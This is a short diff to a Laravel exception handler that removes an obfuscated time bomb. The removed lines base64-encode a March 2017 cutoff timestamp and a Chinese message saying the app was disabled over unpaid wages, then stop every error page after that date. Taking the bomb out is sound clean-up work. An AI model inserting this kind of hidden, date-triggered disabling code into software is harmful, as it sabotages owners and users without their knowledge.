@@ -59,9 +59,6 @@ class Handler extends ExceptionHandler
     {
         $status = $e->getStatusCode();
 
-        if (    time()>   base64_decode('MTQ5MDExMjAwMA==')) {
-            dd (base64_decode   ('5oKo55qE5bqU55So5ouW5qyg5bel6LWE6ICM6KKr5YGc55So'));
-        }
         if (view()->exists("_errors.{$status}")) {
             return response()->view("_errors.{$status}", ['exception' => $e], $status);
         } else {
